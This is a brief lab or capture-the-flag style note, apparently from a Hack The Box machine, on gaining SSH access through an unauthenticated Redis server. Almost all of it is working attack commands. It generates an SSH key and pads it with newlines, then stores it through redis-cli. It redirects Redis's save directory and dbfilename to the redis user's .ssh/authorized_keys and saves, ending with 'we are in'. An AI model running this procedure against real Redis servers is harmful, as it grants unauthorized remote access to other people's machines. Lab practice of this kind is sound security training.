we found a way that we can take advantage of having unauthorized login to redis sever by uploading ssh key to the server 
first we creat ssh key 
ssh-keygen -f postman
then add 2 spaces at the top and the end
(echo -e "\n\n"; cat postman.pub; echo -e "\n\n") > spaced_key.txt
then upload the key to the server
cat spaced_key.txt | redis-cli -h 10.129.209.201 -x set ssh_key
10.129.209.201:6379> config set dir /var/lib/redis/.ssh           
OK
10.129.209.201:6379> config set dbfilename "authorized_keys"
OK
10.129.209.201:6379> save
OK
10.129.209.201:6379> exit
and we are in
